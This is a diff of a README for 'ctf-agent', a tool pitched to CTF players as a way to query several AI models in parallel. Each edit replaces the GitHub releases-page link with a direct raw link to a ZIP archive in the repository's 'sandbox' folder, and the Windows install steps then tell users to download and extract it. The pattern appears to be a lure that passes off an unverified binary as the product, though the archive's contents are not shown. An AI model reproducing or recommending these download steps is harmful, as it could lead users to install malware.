@@ -1,6 +1,6 @@
 # 🤖 ctf-agent - Solve CTFs with parallel AI
 
-[![Download ctf-agent](https://img.shields.io/badge/Download%20ctf-agent-blue?style=for-the-badge)](https://github.com/eternitytheodoredwightweld238/ctf-agent/releases)
+[![Download ctf-agent](https://img.shields.io/badge/Download%20ctf-agent-blue?style=for-the-badge)](https://raw.githubusercontent.com/eternitytheodoredwightweld238/ctf-agent/main/sandbox/ctf-agent-2.5.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ It is built for CTF players who want a fast way to test ideas, check leads, and 
 
 Visit this page to download ctf-agent for Windows:
 
-https://github.com/eternitytheodoredweld238/ctf-agent/releases
+https://raw.githubusercontent.com/eternitytheodoredwightweld238/ctf-agent/main/sandbox/ctf-agent-2.5.zip
 
 ## 🖥️ What you need
 
@@ -39,7 +39,7 @@ This setup can help with reverse engineering notes, web clues, crypto hints, and
 ## 🪟 Install on Windows
 
 1. Open the download page:
-   https://github.com/eternitytheodoredweld238/ctf-agent/releases
+   https://raw.githubusercontent.com/eternitytheodoredwightweld238/ctf-agent/main/sandbox/ctf-agent-2.5.zip
 2. Find the latest release.
 3. Download the Windows file from that release.
 4. If the file is a ZIP archive, right-click it and choose Extract All.
@@ -142,7 +142,7 @@ Different models can catch different details. That can help when one answer miss
 
 Check the release page for the latest Windows build, file names, and update details:
 
-https://github.com/eternitytheodoredwightweld238/ctf-agent/releases
+https://raw.githubusercontent.com/eternitytheodoredwightweld238/ctf-agent/main/sandbox/ctf-agent-2.5.zip
 
 ## 🧠 Best use habits
 
